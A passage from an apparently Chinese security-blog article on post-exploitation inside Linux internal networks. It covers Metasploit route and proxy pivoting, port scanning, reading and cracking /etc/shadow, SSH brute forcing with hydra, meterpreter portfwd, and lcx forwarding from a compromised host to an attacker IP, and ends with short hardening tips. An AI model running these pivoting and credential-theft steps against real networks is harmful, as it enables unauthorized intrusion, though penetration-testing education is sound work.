auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">run autoroute –p</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.48629032258064514" data-type="png" data-w="1240" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/3_RZAhZkjiaica8XoLnFMAyz6tX3uNyw.png" onerror="this.src='http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqvY59wYrysj4lfJAY2vXwpRSic22icsqUzxU4uZzzSg6s0QcF2RZAhZkjiaica8XoLnFMAyz6tX3uNyw/640?wx_fmt=png'" style="box-sizing: border-box !important;word-wrap: break-word !important;width: auto !important;visibility: visible !important;"  /><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />查看路由：<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /><img class="" data-ratio="0.6306451612903226" data-type="png" data-w="1240" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/4_INW0jbvf0iaUCcgiaz9Hl8gdwbBGCw.png" onerror="this.src='http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqvY59wYrysj4lfJAY2vXwpeTibco5rewtWCAulZa7aAyoZOQQINW0jbvf0iaUCcgiaz9Hl8gdwbBGCw/640?wx_fmt=png'" style="box-sizing: border-box !important;word-wrap: break-word !important;width: auto !important;visibility: visible !important;"  /><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />这里已经是添加好的结果，添加路由命令：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">msf exploit(handler) &gt; route add 192.168.16.0 255.255.255.0 12
msf exploit(handler) &gt; route add 192.168.17.0 255.255.255.0 12</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">tcp全局代理转发</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains ，使用方法跟http代理类似。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter shell。</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">metasploit操作可参考：【渗透神器系列】Metasploit</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">端口扫描工具</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />扫描模块：</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">auxiliary/scanner/portscan　　端口扫描</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">scanner/portscan/syn　　SYN端口扫描</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">scanner/portscan/tcp　　TCP端口扫描<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />……</p></li></ul><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">针对22端口的入侵</span></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">尝试hash破解</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">John破解hash</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">Hashcat</p></li></ul><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">注：windows下可以使用mimikatz</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">字典暴力破解</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />工具：</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">hydra</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">msf上的相应模块</p></li></ul><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">针对其他端口的入侵</span></strong></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">针对web服务的入侵</span></strong></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">端口转发的逆袭</span></strong></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？</p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">meterpreter实现端口转发</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">在meterpreter shell中输入：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">meterpreter &gt; portfwd add -l 55555 -r 192.168.16.1 -p 3306</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p><h5 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;">案例</h5><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />发现攻击机上监听了2222端口，连接到了本机其外一个高端口。<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /><img class="" data-ratio="0.20483870967741935" data-type="png" data-w="1240" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/5_SPZ7NYiavlzucsViaVUx7MEm9SP5vA.png" onerror="this.src='http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqvY59wYrysj4lfJAY2vXwpicvKqzjnBlPjK270XlDibAStIAfySPZ7NYiavlzucsViaVUx7MEm9SP5vA/640?wx_fmt=png'" style="box-sizing: border-box !important;word-wrap: break-word !important;width: auto !important;visibility: visible !important;"  /><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />肉鸡的22端口也连接到了肉鸡自己的一个高端口<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  /><img class="" data-ratio="0.03387096774193549" data-type="png" data-w="1240" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/6_FJouh6sic777uQkXlAp9RQ0qwibTnA.png" onerror="this.src='http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqvY59wYrysj4lfJAY2vXwpb3UdDfpOS6q7sQumYMWIrSt9h3FJouh6sic777uQkXlAp9RQ0qwibTnA/640?wx_fmt=png'" style="box-sizing: border-box !important;word-wrap: break-word !important;width: auto !important;visibility: visible !important;"  /><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"  />那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。</p><h4 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.2em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:16px;line-height:36px;;">lcx端口转发</span></h4><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">攻击机：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">lcx -listen 2222 3333 # 2222为转发端口，3333为本机任意未被占用的端口</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">肉鸡：</p><pre style="margin-top: 1.2em;margin-bottom: 1.2em;padding: 0px;max-width: 100%;color: rgb(62, 62, 62);font-size: 1em;background-color: rgb(255, 255, 255);font family: Consolas, Inconsolata, Courier, monospace;line-height: 1.2em;box-sizing: border-box !important;word-wrap: break-word !important;"><code style="margin-right: 0.15em;margin-left: 0.15em;padding: 0.5em 0.7em;max-width: 100%;font-size: 0.85em;font family: Consolas, Inconsolata, Courier, monospace;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);box-sizing: border-box !important;word-wrap: break-word !important;display: block !important;">lcx -slave 110.1.1.1 2222 127.0.0.1 3389</code></pre><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">110.1.1.1为攻击机外网ip，2222为转发端口，127.0.0.1为肉鸡内网ip，3389为远程终端端口 。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">内网嗅探</span></strong></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">　　windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;max-width: 100%;color: rgb(62, 62, 62);white-space: normal;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="font-size:18px;line-height:38px;;color: rgb(0, 122, 170);">linux内网安全建议</span></strong></h3><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);margin-bottom: 1.2em !important;box-sizing: border-box !important;word-wrap: break-word !important;">说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法。</p><ul class=" list-paddingleft-2" style=""><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">每台服务器上安装waf或者云盾，监控并拦截木马程序的运行</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">监控服务器上开启的新端口，查看其连接情况，是否有异常连接</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">服务器及时更新补丁</p></li><li><p style="max-width: 100%;min-height: 1em;box-sizing: border-box !important;word-wrap: break-word !important;">服务器上运行的应用给予低权限</p></li></ul></section></section></section></section><br  /></section><section label="powered by 135editor.com"><p style="white-space: normal;line-height: 25.6px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);box-sizing: border-box !important;word-wrap: break-word !important;text-align: left;background-color: rgb(255, 255, 255);"><span style="text-align: justify;font-size:14px;line-height:34px;;line-height: 1.75em;white-space: pre-wrap;font family: 微软雅黑;font-weight: bold;"><br  /></span></p><p style="white-space: normal;line-height: 25.6px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: right;background-color: rgb(255, 255, 255);box-sizing: border-box !important;word-wrap: break-word !important;"><span style="font-size:14px;line-height:34px;;color: rgb(178, 178, 178);">参考来源：先知安全技术社区</span><span style="text-align: justify;font-size:14px;line-height:34px;;line-height: 1.75em;white-space: pre-wrap;font family: 微软雅黑;font-weight: bold;"></span></p><hr  /><p style="white-space: normal;line-height: 25.6px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);box-sizing: border-box !important;word-wrap: break-word !important;text-align: left;background-color: rgb(255, 255, 255);"><br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3281027104136947" data-s="300,640" src="图片/HACK学习呀_2018-09-25_Linux内网渗透/7_9kZ6Bzp6HKPIkCGYkfBsPynR63cBgg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNajxPOSFB9UFWD40tY4uCrHqy59kZ6Bzp6HKPIkCGYkfBsPynR63cBgg/640?wx_fmt=png'" data-type="png" data-w="701" style=""  /></p></section>
                </div>
</div>
</body>
</html>